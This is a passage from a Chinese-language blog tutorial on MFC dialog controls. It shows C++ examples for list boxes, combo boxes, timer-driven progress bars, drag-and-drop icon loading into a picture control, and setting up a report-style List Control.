class="title">CMFCButtonDlg::OnBnClickedBtnTest</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line">CString strText;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( m_conmpany.<span class="built_in">GetSelCount</span>() == <span class="number">0</span> )&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(_T(<span class="string">&quot;没有选中任何公司&quot;</span>));</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line"><span class="type">int</span> total = m_conmpany.<span class="built_in">GetSelCount</span>();</span><br><span class="line"><span class="type">int</span>* index = <span class="keyword">new</span> <span class="type">int</span>[total];</span><br><span class="line">strText += _T(<span class="string">&quot;您选中了&quot;</span>);</span><br><span class="line">TCHAR buf[<span class="number">32</span>] = _T(<span class="string">&quot;&quot;</span>);</span><br><span class="line">_itow_s(total, buf, <span class="number">32</span>, <span class="number">10</span>);</span><br><span class="line">strText += buf;</span><br><span class="line">strText += _T(<span class="string">&quot;个公司\n&quot;</span>);</span><br><span class="line">m_conmpany.<span class="built_in">GetSelItems</span>(total, index);</span><br><span class="line"></span><br><span class="line">CString strTmp;</span><br><span class="line"><span class="keyword">for</span>( <span class="type">int</span> i = <span class="number">0</span>; i &lt; total; i++ )&#123;</span><br><span class="line">m_conmpany.<span class="built_in">GetText</span>(index[i], strTmp);</span><br><span class="line">strText += strTmp + _T(<span class="string">&quot; &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">delete</span>[] index;</span><br><span class="line"><span class="built_in">MessageBox</span>(strText);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>m_conmpany</code>为我们给listbox这个控件设置的变量。<br>首要判断就是是否选中，选中之后在循环接收。</p><p>别忘了在<code>oninitdialog</code>里面初始化一下这个listbox。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">CMFCButtonDlg::OnInitDialog</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">CDialogEx::<span class="built_in">OnInitDialog</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置此对话框的图标。  当应用程序主窗口不是对话框时，框架将自动</span></span><br><span class="line"><span class="comment">//  执行此操作</span></span><br><span class="line"><span class="built_in">SetIcon</span>(m_hIcon, TRUE);<span class="comment">// 设置大图标</span></span><br><span class="line"><span class="built_in">SetIcon</span>(m_hIcon, FALSE);<span class="comment">// 设置小图标</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加额外的初始化代码</span></span><br><span class="line">m_conmpany.<span class="built_in">AddString</span>(_T(<span class="string">&quot;山东蓝翔&quot;</span>));</span><br><span class="line">m_conmpany.<span class="built_in">AddString</span>(_T(<span class="string">&quot;深圳电子厂&quot;</span>));</span><br><span class="line">m_conmpany.<span class="built_in">AddString</span>(_T(<span class="string">&quot;义乌商超&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;  <span class="comment">// 除非将焦点设置到控件，否则返回 TRUE</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/07/25/mfc01/081.png" class=""><p>效果也不难，就是一些常规操作。</p><hr><h3 id="Combox"><a href="#Combox" class="headerlink" title="Combox"></a>Combox</h3><img src="/2022/07/25/mfc01/083.png" class=""><img src="/2022/07/25/mfc01/084.png" class=""><p>拖出两个控件<br>数据在</p><img src="/2022/07/25/mfc01/085.png" class=""><p>依旧是用分号阻隔。</p><img src="/2022/07/25/mfc01/086.png" class=""><p>样式有三个，除了这个simple特殊一点，因为他不会显示箭头，你选中之后可以通过方向键控制。<br>或者它的神奇之处。。</p><img src="/2022/07/25/mfc01/087.png" class=""><p>你可以在dialog里从下面拉大这个combox，这样他在run的时候就能把在长度之内的列显示出来，虽然有点二。</p><p>当然这种测试都是取出值来玩玩</p><img src="/2022/07/25/mfc01/088.png" class=""><p>左边样式为simple，添加变量<br>右边样式为下拉列表，添加变量<br>然后拖一个按钮，测试用</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCButtonDlg::OnBnClickedBtnDroplist</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line"><span class="type">int</span> cur = m_simple.<span class="built_in">GetCurSel</span>();</span><br><span class="line"><span class="keyword">if</span>( cur == <span class="number">-1</span> )&#123;</span><br><span class="line"><span class="built_in">TRACE</span>(<span class="string">&quot;%s(%d):当前没有选中任何列\n&quot;</span>, __FILE__, __LINE__);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">TRACE</span>(<span class="string">&quot;%s(%d):当前选中了第%d列\n&quot;</span>, __FILE__, __LINE__, cur);</span><br><span class="line">CString tmp;</span><br><span class="line"></span><br><span class="line">m_simple.<span class="built_in">GetLBText</span>(cur, tmp);</span><br><span class="line"><span class="built_in">MessageBox</span>(tmp);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也比较简单</p><img src="/2022/07/25/mfc01/089.png" class=""><p>我们选中哪个就messagebox弹出哪个，并且TRACE在日志打印，注意列之类的遵循从0开始计数。</p><p>那么还有一个下拉列表，直接套前面那个combox也无伤大雅</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCButtonDlg::OnBnClickedBtnDroplist</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line"><span class="type">int</span> cur = m_simple.<span class="built_in">GetCurSel</span>();</span><br><span class="line"><span class="keyword">if</span>( cur == <span class="number">-1</span> )&#123;</span><br><span class="line"><span class="built_in">TRACE</span>(<span class="string">&quot;%s(%d):当前没有选中任何列\n&quot;</span>, __FILE__, __LINE__);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">TRACE</span>(<span class="string">&quot;%s(%d):当前选中了第%d列\n&quot;</span>, __FILE__, __LINE__, cur);</span><br><span class="line">CString tmp;</span><br><span class="line"></span><br><span class="line">m_simple.<span class="built_in">GetLBText</span>(cur, tmp);</span><br><span class="line"><span class="built_in">MessageBox</span>(tmp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cur = m_droplist.<span class="built_in">GetCurSel</span>();</span><br><span class="line"><span class="keyword">if</span>( cur == <span class="number">-1</span> )&#123;</span><br><span class="line"><span class="built_in">TRACE</span>(<span class="string">&quot;%s(%d):当前没有选中任何列\n&quot;</span>, __FILE__, __LINE__);</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">TRACE</span>(<span class="string">&quot;%s(%d):当前选中了第%d列\n&quot;</span>, __FILE__, __LINE__, cur);</span><br><span class="line">CString tmp;</span><br><span class="line"></span><br><span class="line">m_droplist.<span class="built_in">GetLBText</span>(cur, tmp);</span><br><span class="line"><span class="built_in">MessageBox</span>(tmp);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/07/25/mfc01/090.png" class=""><p>能看到日志打印的时候，因为m_simple没有选中过，所以会打印未选中任何列，但是后者m_droplist有选中，就有回执信息。</p><blockquote><p>能get的东西挺多的，用到了翻翻文档就行</p></blockquote><hr><h3 id="Progress"><a href="#Progress" class="headerlink" title="Progress"></a>Progress</h3><p>Progress：进度条<br>一般是要配合定时器去用会好点。</p><img src="/2022/07/25/mfc01/091.png" class=""><p>当然这玩意在dialog界面看着有点效果，但实际你自己没写，他就是空的。</p><p>初始化：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">CMFCButtonDlg::OnInitDialog</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">CDialogEx::<span class="built_in">OnInitDialog</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置此对话框的图标。  当应用程序主窗口不是对话框时，框架将自动</span></span><br><span class="line"><span class="comment">//  执行此操作</span></span><br><span class="line"><span class="built_in">SetIcon</span>(m_hIcon, TRUE);<span class="comment">// 设置大图标</span></span><br><span class="line"><span class="built_in">SetIcon</span>(m_hIcon, FALSE);<span class="comment">// 设置小图标</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加额外的初始化代码</span></span><br><span class="line">m_conmpany.<span class="built_in">AddString</span>(_T(<span class="string">&quot;山东蓝翔&quot;</span>));</span><br><span class="line">m_conmpany.<span class="built_in">AddString</span>(_T(<span class="string">&quot;深圳电子厂&quot;</span>));</span><br><span class="line">m_conmpany.<span class="built_in">AddString</span>(_T(<span class="string">&quot;义乌商超&quot;</span>));</span><br><span class="line"></span><br><span class="line">m_progress.<span class="built_in">SetRange</span>(<span class="number">0</span>, <span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;  <span class="comment">// 除非将焦点设置到控件，否则返回 TRUE</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然有的时候虽然范围可能是整数，但是步长不一样。</p><p>给他加个按钮控制增长。<br><strong>注意改成竖状的时候需要修改进度条外观属性的垂直设置为True</strong></p><p>然后双击按钮</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCButtonDlg::OnBnClickedBtnPrg</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line"><span class="type">int</span> pos = m_progress.<span class="built_in">GetPos</span>();</span><br><span class="line">m_progress.<span class="built_in">SetPos</span>(pos + <span class="number">100</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获取初始的时候，然后每次增加100，反正上限1000，10次就到顶了</p><img src="/2022/07/25/mfc01/092.png" class=""><img src="/2022/07/25/mfc01/093.png" class=""><p>当然实际用途不会蠢蠢的给用户去点击，肯定是要与计时器绑定。<br>选中对话框找到消息里面的Timer</p><img src="/2022/07/25/mfc01/094.png" class=""><p>在头文件中应该预设一个进度值</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//进度</span></span><br><span class="line"><span class="type">int</span> m_progress_pos;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">CMFCButtonDlg::OnInitDialog</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">CDialogEx::<span class="built_in">OnInitDialog</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置此对话框的图标。  当应用程序主窗口不是对话框时，框架将自动</span></span><br><span class="line"><span class="comment">//  执行此操作</span></span><br><span class="line"><span class="built_in">SetIcon</span>(m_hIcon, TRUE);<span class="comment">// 设置大图标</span></span><br><span class="line"><span class="built_in">SetIcon</span>(m_hIcon, FALSE);<span class="comment">// 设置小图标</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加额外的初始化代码</span></span><br><span class="line">m_conmpany.<span class="built_in">AddString</span>(_T(<span class="string">&quot;山东蓝翔&quot;</span>));</span><br><span class="line">m_conmpany.<span class="built_in">AddString</span>(_T(<span class="string">&quot;深圳电子厂&quot;</span>));</span><br><span class="line">m_conmpany.<span class="built_in">AddString</span>(_T(<span class="string">&quot;义乌商超&quot;</span>));</span><br><span class="line"></span><br><span class="line">m_progress.<span class="built_in">SetRange</span>(<span class="number">0</span>, <span class="number">1000</span>);</span><br><span class="line">m_progress_pos = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定时器尽量不要低于30ms，不同机子有少许差别，源自mfc的精度不足导致定时器缺陷</span></span><br><span class="line"><span class="built_in">SetTimer</span>(<span class="number">99</span>, <span class="number">500</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">SetTimer</span>(<span class="number">10</span>, <span class="number">100</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;  <span class="comment">// 除非将焦点设置到控件，否则返回 TRUE</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>初始化设置定时器的时候要注意，因为mfc分层，不同机子处理速度不同，所以定时器精度不要设置太小，以免出现误差。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCButtonDlg::OnTimer</span><span class="params">(UINT_PTR nIDEvent)</span></span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加消息处理程序代码和/或调用默认值</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>( nIDEvent == <span class="number">99</span> )&#123;</span><br><span class="line">m_progress.<span class="built_in">SetPos</span>(m_progress_pos);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>( nIDEvent == <span class="number">10</span> )&#123;</span><br><span class="line"><span class="built_in">TRACE</span>(<span class="string">&quot;%s(%d):%s %d\n&quot;</span>, __FILE__, __LINE__, __FUNCTION__, <span class="built_in">GetTickCount</span>());</span><br><span class="line"><span class="keyword">if</span>( count &gt; <span class="number">5</span> ) <span class="built_in">KillTimer</span>(<span class="number">10</span>);</span><br><span class="line">count++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">CDialogEx::<span class="built_in">OnTimer</span>(nIDEvent);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/07/25/mfc01/095.png" class=""><p>当我们的间隔设置在5，他的误差还在10左右，拉高之后</p><img src="/2022/07/25/mfc01/096.png" class=""><p><strong>反正就是突出mfc对于定时精度处理不足的问题</strong></p><p>那么接下来让他自己动~</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCButtonDlg::OnTimer</span><span class="params">(UINT_PTR nIDEvent)</span></span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加消息处理程序代码和/或调用默认值</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>( nIDEvent == <span class="number">99</span> )&#123;</span><br><span class="line">m_progress.<span class="built_in">SetPos</span>(m_progress_pos);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>( nIDEvent == <span class="number">10</span> )&#123;</span><br><span class="line"><span class="built_in">TRACE</span>(<span class="string">&quot;%s(%d):%s %d\n&quot;</span>, __FILE__, __LINE__, __FUNCTION__, <span class="built_in">GetTickCount</span>());</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> low, upper;</span><br><span class="line">m_progress.<span class="built_in">GetRange</span>(low, upper);</span><br><span class="line"><span class="keyword">if</span>( m_progress_pos &gt;= upper )&#123;</span><br><span class="line"><span class="built_in">KillTimer</span>(<span class="number">10</span>);</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">m_progress_pos += <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">CDialogEx::<span class="built_in">OnTimer</span>(nIDEvent);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要也就是获取这个进度的范围，没到头就慢慢网上递增，像复制文件的话，还得在里面计算文件复制到哪了，然后按比例递增效果更明显。</p><img src="/2022/07/25/mfc01/097.png" class=""><p>静态的图片看不出效果。</p><blockquote><p>这是演示从空到满的情况，相反的，进度的初始值要改成上限，然后这里改成-&#x3D;10<br>理论就是如此，实现另说</p></blockquote><p><strong>哈哈，关于这个进度条，千万不要用多个线程去玩。。不然效果很出奇玩自己了属于是</strong></p><hr><h3 id="图片资源"><a href="#图片资源" class="headerlink" title="图片资源"></a>图片资源</h3><p>也是拖出一个picture control。</p><img src="/2022/07/25/mfc01/098.png" class=""><p>有意思的是命名直接是static，和之前的静态文本框有点相似</p><img src="/2022/07/25/mfc01/099.png" class=""><p>拖个静态文本框可以看到有点相同</p><img src="/2022/07/25/mfc01/100.png" class=""><p>反正父类总有一个是一样的。</p><p>控制这些玩意就老样子添加变量&#x2F;控件，添加完之后自然没啥效果。。都没把图片塞进去</p><p>点击dialog，从消息里面找到</p><img src="/2022/07/25/mfc01/101.png" class=""><p>file就是跟文件相关的。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCButtonDlg::OnDropFiles</span><span class="params">(HDROP hDropInfo)</span></span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加消息处理程序代码和/或调用默认值</span></span><br><span class="line"><span class="type">int</span> count = <span class="built_in">DragQueryFile</span>(hDropInfo, <span class="number">-1</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//count &gt; 1 Msg..</span></span><br><span class="line">TCHAR sPath[MAX_PATH];</span><br><span class="line"><span class="type">char</span> mbsPath[MAX_PATH * <span class="number">2</span>];</span><br><span class="line"><span class="keyword">for</span>( <span class="type">int</span> i = <span class="number">0</span>; i &lt; count; i++ )&#123;</span><br><span class="line"><span class="built_in">memset</span>(sPath, <span class="number">0</span>, <span class="built_in">sizeof</span>(sPath));</span><br><span class="line"><span class="built_in">memset</span>(mbsPath, <span class="number">0</span>, <span class="built_in">sizeof</span>(mbsPath));</span><br><span class="line"><span class="built_in">DragQueryFile</span>(hDropInfo, i, sPath, MAX_PATH);</span><br><span class="line"><span class="type">size_t</span> total = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">wcstombs_s</span>(&amp;total, mbsPath, <span class="built_in">sizeof</span>(mbsPath), sPath, MAX_PATH);</span><br><span class="line"><span class="built_in">TRACE</span>(<span class="string">&quot;%s(%d):%s %s\n&quot;</span>, __FILE__, __LINE__, __FUNCTION__, mbsPath);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="built_in">CString</span>(sPath).<span class="built_in">Find</span>(_T(<span class="string">&quot;.ico&quot;</span>)) )&#123;</span><br><span class="line">HICON hicon = (HICON)<span class="built_in">LoadImage</span>(<span class="built_in">AfxGetInstanceHandle</span>(), sPath, IMAGE_ICON, <span class="number">0</span>, <span class="number">0</span>, LR_LOADFROMFILE | LR_DEFAULTSIZE);</span><br><span class="line">m_pictrue.<span class="built_in">SetIcon</span>(hicon);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">InvalidateRect</span>(<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">CDialogEx::<span class="built_in">OnDropFiles</span>(hDropInfo);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>写完之后有一个地方需要注意，因为这个用的图片类型是<code>.ico</code>想直接用mfc那个图片了，所以要修改图片框的类型</p><img src="/2022/07/25/mfc01/102.png" class=""><p>将其修改完之后</p><img src="/2022/07/25/mfc01/103.png" class=""><p>看到样式发生了变化，有点小</p><p>右击打开项目的路径，找到res文件夹，里面就有个mfc的ico</p><img src="/2022/07/25/mfc01/104.png" class=""><p>刚开始运行的时候，是看不到图片框的</p><img src="/2022/07/25/mfc01/105.png" class=""><p>这里忘了一个事，就是设置对话框可接受文件</p><img src="/2022/07/25/mfc01/107.png" class=""><p>不设置为true的话，图片拖动是禁止的。</p><p>设置true之后拖动图片到对话框上，发现的确显示了。</p><img src="/2022/07/25/mfc01/106.png" class=""><p>并且，日志也输出了这个图片的路径</p><img src="/2022/07/25/mfc01/108.png" class=""><hr><h3 id="List-Control"><a href="#List-Control" class="headerlink" title="List Control"></a>List Control</h3><img src="/2022/07/25/mfc01/109.png" class=""><p>长的吧跟列表又有点相似。倒是多了图标</p><img src="/2022/07/25/mfc01/110.png" class=""><p>其中有几种可选，默认为icon样式</p><p>在list视图下就真的跟列表一样了。</p><img src="/2022/07/25/mfc01/111.png" class=""><p>report视图感觉会用的多一点</p><img src="/2022/07/25/mfc01/112.png" class=""><p>这里先用report，为这个控件添加变量，然后初始化一下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">CMFCButtonDlg::OnInitDialog</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">CDialogEx::<span class="built_in">OnInitDialog</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置此对话框的图标。  当应用程序主窗口不是对话框时，框架将自动</span></span><br><span class="line"><span class="comment">//  执行此操作</span></span><br><span class="line"><span class="built_in">SetIcon</span>(m_hIcon, TRUE);<span class="comment">// 设置大图标</span></span><br><span class="line"><span class="built_in">SetIcon</span>(m_hIcon, FALSE);<span class="comment">// 设置小图标</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加额外的初始化代码</span></span><br><span class="line">m_conmpany.<span class="built_in">AddString</span>(_T(<span class="string">&quot;山东蓝翔&quot;</span>));</span><br><span class="line">m_conmpany.<span class="built_in">AddString</span>(_T(<span class="string">&quot;深圳电子厂&quot;</span>));</span><br><span class="line">m_conmpany.<span class="built_in">AddString</span>(_T(<span class="string">&quot;义乌商超&quot;</span>));</span><br><span class="line"></span><br><span class="line">m_progress.<span class="built_in">SetRange</span>(<span class="number">0</span>, <span class="number">1000</span>);</span><br><span class="line">m_progress_pos = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//定时器尽量不要低于30ms，不同机子有少许差别，源自mfc的精度不足导致定时器缺陷</span></span><br><span class="line"><span class="built_in">SetTimer</span>(<span class="number">99</span>, <span class="number">500</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">SetTimer</span>(<span class="number">10</span>, <span class="number">100</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化列</span></span><br><span class="line">m_list.<span class="built_in">InsertColumn</span>(<span class="number">0</span>, _T(<span class="string">&quot;序号&quot;</span>));</span><br><span class="line">m_list.<span class="built_in">InsertColumn</span>(<span class="number">1</span>, _T(<span class="string">&quot;IP&quot;</span>));</span><br><span class="line">m_list.<span class="built_in">InsertColumn</span>(<span class="number">2</span>, _T(<span class="string">&quot;ID&quot;</span>));</span><br><span class="line">m_list.<span class="built_in">InsertColumn</span>(<span class="number">3</span>, _T(<span class="string">&quot;CHECK&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;  <span class="comment">// 除非将焦点设置到控件，否则返回 TRUE</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/07/25/mfc01/113.png" class=""><p>设置文字是没啥问题了，但是一开始他都是缩在一团还要拉开太麻烦了。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">m_list.<span class="built_in">InsertColumn</span>(<span class="number">0</span>, _T(<span class="string">&quot;序号&quot;</span>), LVCFMT_LEFT, <span class="number">50</span>);</span><br><span class="line">m_list.<span class="built_in">InsertColumn</span>(<span class="number">1</span>, _T(<span class="string">&quot;IP&quot;</span>), LVCFMT_LEFT, <span class="number">200</span>);</span><br><span class="line">m_list.<span class="built_in">InsertColumn</span>(<span class="number">2</span>, _T(<span class="string">&quot;ID&quot;</span>), LVCFMT_LEFT, <span class="number">180</span>);</span><br><span class="line">m_list.<span class="built_in">InsertColumn</span>(<span class="number">3</span>, _T(<span class="string">&quot;CHECK&quot;</span>), LVCFMT_LEFT, <span class="number">200</span>);</span><br></pre></td></tr></table></figure><p>修改完之后，其实还要调整一下list control在对话框里面的大小</p><img src="/2022/07/25/mfc01/114.png" class=""><p>目前来说调整成这样差不多。再不济，空间有限的情况下，给他上滚动条</p><p>除此之外也可以用代码实现改变style，同样在初始化的地方</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DWORD extStyle = m_list.<span class="built_in">GetExtendedStyle</span>();</span><br><span class="line">extStyle |= LVS_EX_FULLROWSELECT;</span><br><span class="line">extStyle |= LVS_EX_GRIDLINES;</span><br><span class="line">m_list.<span class="built_in">SetExtendedStyle</span>(extStyle);</span><br></pre></td></tr></table></figure><img src="/2022/07/25/mfc01/115.png" class=""><p>多了点格子，目前还没有数据</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//列增加数据</span></span><br><span class="line">m_list.<span class="built_in">InsertItem</span>(<span class="number">0</span>, <span class="built_in">CString</span>(<span class="string">&quot;0&quot;</span>));</span><br><span class="line">m_list.<span class="built_in">SetItemText</span>(<span 